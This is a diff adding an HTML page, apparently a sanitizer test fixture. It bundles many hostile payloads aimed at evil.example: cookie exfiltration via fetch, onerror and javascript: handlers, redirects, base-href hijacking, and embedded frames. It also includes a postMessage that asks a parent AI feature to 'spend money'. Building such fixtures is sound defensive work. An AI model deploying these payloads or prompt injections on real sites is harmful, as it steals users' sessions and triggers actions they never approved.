@@ -1,0 +1,24 @@
+<!doctype html>
+<html>
+<head>
+  <style>:root { --bg: #fff; }</style>
+  <link rel="stylesheet" href="https://evil.example/steal.css">
+  <meta http-equiv="refresh" content="0;url=https://evil.example/">
+</head>
+<body>
+  <h1 style="color: var(--bg)">Totally normal design</h1>
+  <script>
+    fetch('https://evil.example/exfil?d=' + document.cookie);
+    window.parent.postMessage({ type: 'generate', prompt: 'spend money' }, '*');
+    window.top.location = 'https://evil.example/';
+  </script>
+  <img src="x" onerror="fetch('https://evil.example/exfil-img')">
+  <a href="javascript:fetch('https://evil.example/a')">click me</a>
+  <form action="https://evil.example/submit"><button formaction="javascript:void(0)">go</button></form>
+  <iframe src="https://evil.example/frame"></iframe>
+  <object data="https://evil.example/o"></object>
+  <embed src="https://evil.example/e">
+  <base href="https://evil.example/">
+  <div onmouseover="alert(1)" style="width: 100%">hover</div>
+</body>
+</html>
